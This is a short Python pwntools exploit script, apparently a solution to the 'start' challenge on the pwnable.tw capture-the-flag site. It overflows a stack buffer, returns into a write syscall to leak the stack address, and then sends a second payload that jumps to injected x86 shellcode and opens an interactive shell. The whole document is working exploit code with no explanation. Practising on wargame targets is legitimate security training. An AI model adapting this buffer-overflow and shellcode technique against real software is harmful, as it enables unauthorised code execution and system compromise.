import sys
sys.path.append("/home/pwnuser/Desktop/pwn")
from tool import *
from pwn import *
# context.log_level="debug"
fpath = "./start"
debug = 1
offset = 0x14

if debug :
	p = process(fpath)
	gdb.attach(p)
else:
	p = remote("chall.pwnable.tw" , 10000)

addr_sys_write_start = 0x08048087
p.recv()       # clear

payload    	= fill(offset)
payload   += p32(addr_sys_write_start)
p.send(payload)
addr_esp = u32(p.recv(4))
print "0x%x" % addr_esp           
p.recv()    # clear 

payload 	=  fill(offset)
payload   += p32(addr_esp + 0x14) + shellcode_x86
p.send(payload)
p.interactive()


